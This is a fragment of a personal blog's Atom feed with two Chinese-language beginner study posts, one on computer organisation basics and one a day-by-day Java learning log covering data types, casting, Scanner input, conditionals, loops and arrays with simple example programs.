    <link href="https://sakurahack-y.github.io/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    <id>https://sakurahack-y.github.io/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/</id>
    <published>2022-02-11T14:22:04.000Z</published>
    <updated>2022-02-12T15:26:41.110Z</updated>
    
    <content type="html"><![CDATA[<p>前言：由于本人非计算机专业(苦逼化工狗)，所以想要自己补一下计算机的基础，这样才能发展的更远，所以开了这一栏，以后会坚持更新~</p><h1 id="计算机组成原理概述篇"><a href="#计算机组成原理概述篇" class="headerlink" title="计算机组成原理概述篇"></a>计算机组成原理概述篇</h1><h2 id="计算机的发展历史"><a href="#计算机的发展历史" class="headerlink" title="计算机的发展历史"></a>计算机的发展历史</h2><h3 id="计算机发展的四个阶段"><a href="#计算机发展的四个阶段" class="headerlink" title="计算机发展的四个阶段"></a>计算机发展的四个阶段</h3><p>第一个阶段:电子管计算机</p><p>集成度小，空间占用大</p><p>功耗高，运行速度慢</p><p>操作复杂，更换程序需要接线</p><p>第二个阶段:晶体管计算机</p><p>集成度相对较高，空间占用相对小</p><p>功耗相对较低，运行速度快</p><p>操作相对简单，交互更加方便</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211222959451.png" alt="image-20220211222959451"></p><p>第三个阶段:集成电路计算机</p><p>计算机变得更小</p><p>功耗变得更低</p><p>计算速度变得更快</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211223618107.png" alt="image-20220211223618107"></p><p>第四个阶段:超大规模集成电路计算机</p><p>一个芯片集成了上百万的晶体管<br>速度更快，体积更小，价格更低，更能被大众接受</p><p>用途丰富:文本处理，表格处理，高交互的游戏与应用</p><p>第五个阶段:未来计算机</p><p>生物计算机，以蛋白质分子作为主要原材料:</p><p>体积小，效率高</p><p>不易损坏</p><p>不受信号干扰，无热损耗 1</p><p>量子计算机</p><h3 id="微型计算机的发展历史"><a href="#微型计算机的发展历史" class="headerlink" title="微型计算机的发展历史"></a>微型计算机的发展历史</h3><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211224519853.png" alt="image-20220211224519853"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211224544536.png" alt="image-20220211224544536"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211224641392.png" alt="image-20220211224641392"></p><h2 id="计算机的分类"><a href="#计算机的分类" class="headerlink" title="计算机的分类"></a>计算机的分类</h2><p>超级计算机:</p><p>功能最强、运算速度最快、存储容量最大的计算机</p><p>多用于国家高科技领域和尖端技术研究</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225354851.png" alt="image-20220211225354851"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225444783.png" alt="image-20220211225444783"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225558827.png" alt="image-20220211225558827"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225812247.png" alt="image-20220211225812247"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225834345.png" alt="image-20220211225834345"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225944642.png" alt="image-20220211225944642"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230055284.png" alt="image-20220211230055284"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230109064.png" alt="image-20220211230109064"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230145911.png" alt="image-20220211230145911"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230155449.png" alt="image-20220211230155449"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230249731.png" alt="image-20220211230249731"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230318814.png" alt="image-20220211230318814"></p><h2 id="计算机的体系与结构"><a href="#计算机的体系与结构" class="headerlink" title="计算机的体系与结构"></a>计算机的体系与结构</h2><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212231520062.png" alt="image-20220212231520062"></p><p><strong>必须有一个存储器</strong></p><p><strong>必须有一个控制器</strong></p><p><strong>必须有一个运算器</strong></p><p><strong>必须有输入设备</strong></p><p><strong>必须有输出设备</strong></p><p>现代计算机都是冯诺依曼机</p><p>功能:</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232001255.png" alt="image-20220212232001255"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232045504.png" alt="image-20220212232045504"></p><p>瓶颈:</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232350723.png" alt="image-20220212232350723"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232427464.png" alt="image-20220212232427464"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232520952.png" alt="image-20220212232520952"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232603902.png" alt="image-20220212232603902"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前言：由于本人非计算机专业(苦逼化工狗)，所以想要自己补一下计算机的基础，这样才能发展的更远，所以开了这一栏，以后会坚持更新~&lt;/p&gt;
&lt;h1 id=&quot;计算机组成原理概述篇&quot;&gt;&lt;a href=&quot;#计算机组成原理概述篇&quot; class=&quot;headerlink&quot; title=&quot;计</summary>
      
    
    
    
    <category term="计算机基础" scheme="https://sakurahack-y.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="计算机组成原理" scheme="https://sakurahack-y.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="计算机组成原理" scheme="https://sakurahack-y.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>java学习之旅</title>
    <link href="https://sakurahack-y.github.io/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/"/>
    <id>https://sakurahack-y.github.io/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/</id>
    <published>2022-02-11T08:00:26.000Z</published>
    <updated>2022-03-03T17:20:30.677Z</updated>
    
    <content type="html"><![CDATA[<p>本篇文章更新java系列知识—持续更新中</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211163044997.png" alt="image-20220211163044997"></p><h1 id="day1-java初识"><a href="#day1-java初识" class="headerlink" title="day1  java初识"></a>day1  java初识</h1><h2 id="第一个HelloWord程序"><a href="#第一个HelloWord程序" class="headerlink" title="第一个HelloWord程序"></a>第一个HelloWord程序</h2><pre><code class="java">/*这里HelloWord是类名void main 是方法，也是程序的入口void 空main 主函数*/class HelloWord&#123;    public static void main(String[] args)&#123;                System.out.println(&quot;Hello Word!&quot;);    &#125;&#125;</code></pre><p>首先用 javac helloword.java –&gt;编译为   helloword.class</p><p>然后 java helloword 执行(这里注意不要加后缀!)</p><p>结果如下：</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211171119785.png" alt="image-20220211171119785"></p><p>注意点:</p><p>1、java中严格区分大小写</p><p>2、要记得更改编辑器的编码方式 要保持编码一致才能运行</p><p>3、每一行语句结束必须以;结束</p><p>4、注意缩进</p><p>5、类名是什么，生成的字节码文件是什么，与原文件名字没有直接关系。</p><p>6、当类是公共的，既用public修饰类，类名必须与文件名保持一致</p><p>7、一个java文件中可以有多个类，每个类在编译后都会生成一个字节码文件。</p><h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211210820972.png" alt="image-20220211210820972"></p><p>关键字有：</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211210537067.png" alt="image-20220211210537067"></p><p>其中const和goto是保留字</p><h2 id="规范"><a href="#规范" class="headerlink" title="规范:"></a>规范:</h2><p>1、见名知意</p><p>2、驼峰命名</p><p>当变量名 方法名 参数名 由两个或两个单词以上组成时，从第二个单词开始首字母大写</p><p>如：userName passWord</p><p>3、对常量进行命名时，每个单词的字母都大写，而且单词与单词之间使用_相连</p><p>如: MAX_NUM</p><p>4、对类进行命名时，对每一个单词的首字母大写</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>基本数据类型(四类八种):</p><p>整数型:</p><p>​        byte 字节类型        short         int         long</p><p>浮点类型:</p><p>​        float 单精度        double 双精度</p><p>字符型: </p><p>​        char</p><p>布尔型:</p><p>​        boolean:</p><p>​            true        false</p><p>引用类型数据:字符串 类 接口</p><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p> 字符串常量            浮点类型常量             字符常量           布尔类型常量            内置的常量</p><p>“HelloWoerd”                3.14                         ‘你’                        true                       Math.PI</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>在程序执行过程中，其值可以改变的量</p><p>三要素:</p><p>变量类型        变量名        变量值</p><p>如何申明变量?</p><p>数据类型+变量名</p><p>申明整数类型变量:</p><p>byte b;        long 1;</p><p>同理可生成</p><p>float f;    double d;    char c;    String s;</p><p>在方法内的变量 申明后要赋值才能使用</p><p>变量的实质就是申请内存</p><h1 id="day2-java基础语法"><a href="#day2-java基础语法" class="headerlink" title="day2  java基础语法"></a>day2  java基础语法</h1><h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换:"></a>进制转换:</h2><pre><code class="java">class Sakura&#123;        public static void main(String [] args)&#123;            System.out.println(666);   //十进制            System.out.println(0b1010011010); //二进制  0b开头            System.out.println(01232);  //八进制 0开头            System.out.println(0x29a); //十六进制 0x开头            &#125;&#125;</code></pre><p>输出结果:</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212154216121.png" alt="image-20220212154216121"></p><h2 id="计算机存储单位"><a href="#计算机存储单位" class="headerlink" title="计算机存储单位"></a>计算机存储单位</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212154344804.png" alt="image-20220212154344804"></p><p>1 byte = 8 bit;  没有符号的范围: 2^8-1  有符号(第一位做符号位): -128 - 127</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212160938532.png" alt="image-20220212160938532"></p><p>整数类型   注意:</p><p>1、整数类型，默认的数据类型是int</p><p>2、错误：不兼容的类型：从int转换到byte可能有损失</p><p>当我们赋的值在byte或者short的范围内则不会有变化</p><p>但是当赋的值不在byte或者short的范围内则会将此值作为int类型处理<br>3、错误:过大的整数：2222222222</p><p>生命long类型数值的时候，要在数值的末尾+L</p><p>浮点类型    注意:</p><p>1、浮点类型 默认的数据类型是double</p><p>2、不兼容的类型：从double转换到float可能会有损失</p><p>申明float类型的数据 要在数值的末尾 +  F</p><p>float f =3.14F</p><p>3、浮点类型底层采用的是科学计数法方式</p><p>4、小数底层存储方式与整数不同  有符号位 指数位 整数位</p><p>5、小数不能精确的表示一个值 (如果要精确的表示需要用到bigdecimal)</p><h2 id="计算机如何存储数据"><a href="#计算机如何存储数据" class="headerlink" title="计算机如何存储数据"></a>计算机如何存储数据</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212172832527.png" alt="image-20220212172832527"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212172817453.png" alt="image-20220212172817453"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212173056936.png" alt="image-20220212173056936"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212173119494.png" alt="image-20220212173119494"></p><h2 id="自动类型提升"><a href="#自动类型提升" class="headerlink" title="自动类型提升"></a>自动类型提升</h2><p>基本类型数据转换:</p><p>1、自动类型提升</p><p>小的数据类型 可以自动转换为大的数据类型</p><pre><code class="java">int d = 3;double f = d;</code></pre><p>2、强制类型转换</p><p>错误：不兼容的类型，从double转换到int可能会有损失</p><p> 强制转换的公式:</p><p>小的数据类型 标识符 = (小的数据类型)大的数据类型</p><pre><code class="java">double d = 3.14;int num = (int)d;</code></pre><p>特殊情况</p><pre><code class="java">class Sakura&#123;        public static void main(String [] args)&#123;            int a = 200;            byte b = (byte)a;            System.out.println(b);        &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212221045664.png" alt="image-20220212221045664"></p><p>为什么这里是-56呢？</p><p>首先我们知道 int是四个字节，而byte只有一个字节，200的二进制数为 11001000</p><p>刚好byte可以全部接受，但是byte第一位是符号位，首位是1，所以是负数，计算机的存储方式是以补码的形式存储。11001000—&gt;10110111(反码)—&gt;10111000(补码)</p><p>转化为十进制就是-56</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212221721358.png" alt="image-20220212221721358"></p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212222704014.png" alt="image-20220212222704014"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212222746808.png" alt="image-20220212222746808"></p><p>注意:</p><p>1、整数相除，不保留小数</p><p>2、如果想要显示小数，使用浮点类型计算</p><p>3、 byte与byte  short与short char与char 做运算，或者他们之间混合运算，则结果会变为int类型</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212225720878.png" alt="image-20220212225720878"></p><p>使用赋值运算符是不会发生类型转换的</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212230210588.png" alt="image-20220212230210588"></p><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220213150338148.png" alt="image-20220213150338148"></p><h3 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220213150648548.png" alt="image-20220213150648548"></p><h1 id="day3-流程控制语句"><a href="#day3-流程控制语句" class="headerlink" title="day3  流程控制语句"></a>day3  流程控制语句</h1><h2 id="输入语句-scanner"><a href="#输入语句-scanner" class="headerlink" title="输入语句 scanner"></a>输入语句 scanner</h2><pre><code class="java">import java.util.*;class InputTest&#123;    public static void main(String [] args)&#123;            Scanner input = new Scanner(System.in);            // 创建input对象, &quot;input&quot;是变量，可为任意值            // System.in 输入流             // 输入数据必须与接受类型匹配，不然会报错 如下图            //Scanner类型没有提供返回char类型数据的方法            /*            可以采用 字符串.charAt(0);   0代表字符串内第一个字符，1代表第二个......            char cc = &quot;你好&quot;.charAt(0);            System.out.println(cc);   ---你            */            System.out.println(&quot;请输入你的年龄&quot;);            int age = input.nextInt();            System.out.println(&quot;你的年龄是&quot;+age);            System.out.println(&quot;请输入你的身高&quot;);            double height = input.nextDouble();            System.out.println(&quot;你的身高是&quot;+height);            System.out.println(&quot;请输入你的姓名&quot;);            String name = input.next();            System.out.println(&quot;你的姓名是&quot;+name);            &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220219224259748.png" alt="image-20220219224259748"></p><h2 id="next与nextLine"><a href="#next与nextLine" class="headerlink" title="next与nextLine"></a>next与nextLine</h2><p>键盘输入一个地址</p><pre><code class="java">/*1、导包2、创建对象3、对象调方法*/import java.util.*;class InputTest&#123;    public static void main(String [] args)&#123;        Scanner input = new Scanner(System.in);        System.out.println(&quot;您的地址是&quot;);        String address = input.next();        System.out.println(&quot;您的地址是&quot;+address);    &#125;    &#125;</code></pre><p>注意:<br>    next()无法接受 空格之后的内容</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220223643121.png" alt="image-20220220223643121"></p><p>此时我们可以用nextLine(可以接受整行内容)</p><pre><code class="java">String address = input.nextLine();</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220223819952.png" alt="image-20220220223819952"></p><p>nextLine存在一些问题:</p><pre><code class="java">import java.util.*;class InputTest&#123;    public static void main(String [] args)&#123;        Scanner input = new Scanner(System.in);         System.out.println(&quot;您的身高是&quot;);        double height = input.nextDouble();        System.out.println(&quot;您的身高是:&quot;+height);        System.out.println(&quot;您的地址是&quot;);        String address = input.nextLine();        System.out.println(&quot;您的地址是:&quot;+address);    &#125;&#125;</code></pre><p>当代码如上时，运行程序会出现以下后果:</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220224758917.png" alt="image-20220220224758917"></p><p>我们发现第二个输出直接结束了，这是因为nextLine遇到回车，会误认为代码已经结束了。</p><p>解决办法:</p><p>在中间加入一个</p><pre><code class="java">input.nextLine();</code></pre><p>来接受回车</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220225008607.png" alt="image-20220220225008607"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220225108040.png" alt="image-20220220225108040"></p><p>这样问题就解决了</p><h2 id="if单分支"><a href="#if单分支" class="headerlink" title="if单分支"></a>if单分支</h2><pre><code class="java">/*if分支：    if单分支        if(boolean表达式)&#123;            分支内容        &#125;*/import java.util.*;class IfTest&#123;    public static void main(String [] args)&#123;        Scanner in = new Scanner(System.in);        System.out.println(&quot;请输入您的年龄&quot;);        int age = in.nextInt();        if(age &gt;= 18)&#123;            System.out.println(&quot;您已经成年，可以上网了&quot;);        &#125;        if(age &lt; 18)&#123;            System.out.println(&quot;您还没有成年,please go out!&quot;);        &#125;        &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220231710122.png" alt="image-20220220231710122"></p><h2 id="小习题-闰年的标准"><a href="#小习题-闰年的标准" class="headerlink" title="小习题-闰年的标准"></a>小习题-闰年的标准</h2><p>闰年的标准(两者满足其一即可):</p><p>1、能被4整除，不能被100整除</p><p>2、能被400整除</p><p>代码功能:</p><p>输入一个数判断是否是闰年</p><pre><code class="java">import java.util.*;class RunYears&#123;    public static void main(String [] args)&#123;        Scanner input = new Scanner(System.in);        System.out.println(&quot;请输入一个年份:&quot;);        int years = input.nextInt();        if((years%4==0&amp;&amp;years%100!=0)||(years%400==0))            System.out.println(years+&quot;是闰年！&quot;);    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220233501106.png" alt="image-20220220233501106"></p><h2 id="if双分支"><a href="#if双分支" class="headerlink" title="if双分支"></a>if双分支</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220233824314.png" alt="image-20220220233824314"></p><h2 id="求三个数中的最大值"><a href="#求三个数中的最大值" class="headerlink" title="求三个数中的最大值"></a>求三个数中的最大值</h2><pre><code class="java">import java.util.*;class MaxNum&#123;    public static void main(String [] args)&#123;        int a = 50;        int b = 999;        int c = 12;        if(a &gt; b)&#123;            if(a &gt; c)&#123;                System.out.println(&quot;a是三个数中的最大值&quot;);            &#125;else&#123;                System.out.println(&quot;c是三个数中的最大值&quot;);            &#125;                &#125;else&#123;            if(b &lt; c)&#123;                System.out.println(&quot;c是三个数中的最大值&quot;);            &#125;else&#123;                System.out.println(&quot;b是三个数中的最大值&quot;);            &#125;                    &#125;    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221001754310.png" alt="image-20220221001754310"></p><h2 id="if多分支"><a href="#if多分支" class="headerlink" title="if多分支"></a>if多分支</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221002157818.png" alt="image-20220221002157818"></p><h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><p> <img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221002546023.png" alt="image-20220221002546023"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221003440041.png" alt="image-20220221003440041"></p><p>case后面的数据必须与表达式类型一致</p><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><p>满足特定条件反复执行的代码</p><p>任何一个标准的循环都有四个条件:</p><p><strong>初始化条件</strong></p><p><strong>循环条件</strong></p><p><strong>循环体</strong></p><p><strong>迭代条件</strong></p><p>实例:</p><pre><code class="java">import java.util.*;class Repeat&#123;     public static void main(String [] args)&#123;        int i = 0;        while(i&lt;10)&#123;            System.out.println(&quot;Hello Word&quot;);            i++;        &#125;            &#125;        &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221005248322.png" alt="image-20220221005248322"></p><h1 id="day4-循环"><a href="#day4-循环" class="headerlink" title="day4 循环"></a>day4 循环</h1><h2 id="do-while"><a href="#do-while" class="headerlink" title="do while"></a>do while</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221233148427.png" alt="image-20220221233148427"></p><h2 id="随机数公式"><a href="#随机数公式" class="headerlink" title="随机数公式"></a>随机数公式</h2><p>Math.random();         返回一个double值 [0.0,1.0]</p><p>如果我们要求 m~n的数</p><p>公式: (int)(Math.random()*(n-m+1)+m);</p><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><pre><code class="java">for 循环:    for(初始化条件;循环条件;迭代条件)&#123;        循环体        &#125;</code></pre><h2 id="break"><a href="#break" class="headerlink" title="break"></a>break</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221234457129.png" alt="image-20220221234457129"></p><h2 id="continue、return、continue的区别"><a href="#continue、return、continue的区别" class="headerlink" title="continue、return、continue的区别"></a>continue、return、continue的区别</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221234650112.png" alt="image-20220221234650112"></p><h1 id="day5-数组"><a href="#day5-数组" class="headerlink" title="day5 数组"></a>day5 数组</h1><h2 id="数组初识"><a href="#数组初识" class="headerlink" title="数组初识"></a>数组初识</h2><p>数组: 容器 存储数据</p><p>相同类型数据的有序集合</p><h3 id="声明一个数组"><a href="#声明一个数组" class="headerlink" title="声明一个数组"></a>声明一个数组</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222000443403.png" alt="image-20220222000443403"></p><h3 id="数组初始化"><a href="#数组初始化" class="headerlink" title="数组初始化"></a>数组初始化</h3><p>两种</p><h4 id="静态初始化"><a href="#静态初始化" class="headerlink" title="静态初始化"></a>静态初始化</h4><pre><code class="java">arr = new int[]&#123;1,2,3,4,5&#125;;  int [] arr1 = new int[]&#123;1,2,3,4,5&#125;;//已经指定元素</code></pre><h4 id="动态初始化"><a href="#动态初始化" class="headerlink" title="动态初始化"></a>动态初始化</h4><pre><code class="java">arr =new int[4]; //没有指定元素double [] arrDouble = new double[5];</code></pre><p>注意:</p><p><strong>数组内元素的类型要保持一致</strong></p><h3 id="数组元素的访问"><a href="#数组元素的访问" class="headerlink" title="数组元素的访问"></a>数组元素的访问</h3><pre><code class="java">int [] arr = &#123;1,2,3&#125;;System.out.println(arr[0]);System.out.println(arr[1]);System.out.println(arr[2 ]);</code></pre><h3 id="数组长度显示"><a href="#数组长度显示" class="headerlink" title="数组长度显示"></a>数组长度显示</h3><p>arr.length 表示数组内元素的数量</p><pre><code class="java">System.out.println(arr.length);    </code></pre><p>获取最后一个元素的巧妙方法</p><pre><code class="java">System.out.println(arr[arr.length-1]);</code></pre><h2 id="数组的默认初始化"><a href="#数组的默认初始化" class="headerlink" title="数组的默认初始化"></a>数组的默认初始化</h2><p>数组声明之后，数据类型不同，数组中就会有不同的默认值</p><p>byte 0   short 0    int  0    long 0    double 0.0    float 0.0     char ‘\u0000’     boolean false</p><p>引用数据类型默认值都是null String</p><h2 id="数组的遍历"><a href="#数组的遍历" class="headerlink" title="数组的遍历"></a>数组的遍历</h2><p>1、借用for循环</p><pre><code class="java">for(int i = 0;i&lt;(arr.length-1);i++)&#123;            System.out.println(arr[i]);        &#125;</code></pre><p>2、</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222004651762.png" alt="image-20220222004651762"></p><p>代码:</p><pre><code class="java">import java.util.*;class ArrayTest&#123;     public static void main(String [] args)&#123;        int [] arr = &#123;1,2,3,4,5,6,7,8,9&#125;;        for(int i = 0;i&lt;(arr.length-1);i++)&#123;            System.out.println(arr[i]);        &#125;        System.out.println(&quot;----------------------&quot;);        for(int a :arr)&#123;            System.out.println(a);            &#125;    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222005429006.png" alt="image-20220222005429006"></p><h2 id="数组的内存划分"><a href="#数组的内存划分" class="headerlink" title="数组的内存划分"></a>数组的内存划分</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222221319026.png" alt="image-20220222221319026"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222221347039.png" alt="image-20220222221347039"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222221947302.png" alt="image-20220222221947302"></p><h2 id="数组名"><a href="#数组名" class="headerlink" title="数组名"></a>数组名</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222222235753.png" alt="image-20220222222235753"></p><h2 id="数组练习"><a href="#数组练习" class="headerlink" title="数组练习"></a>数组练习</h2><h3 id="学生成绩"><a href="#学生成绩" class="headerlink" title="学生成绩"></a>学生成绩</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222222650621.png" alt="image-20220222222650621"></p><pre><code class="java">import java.util.*;class ArrayTest&#123;    public static void main(String [] args)&#123;        int [] arr = new int[5];        Scanner input =new Scanner(System.in);        int scores = 0;        for(int i = 0;i &lt; 5;i++)&#123;            System.out.println(&quot;请输入第&quot;+(i+1)+&quot;个学生的成绩&quot;);            arr[i] = input.nextInt();            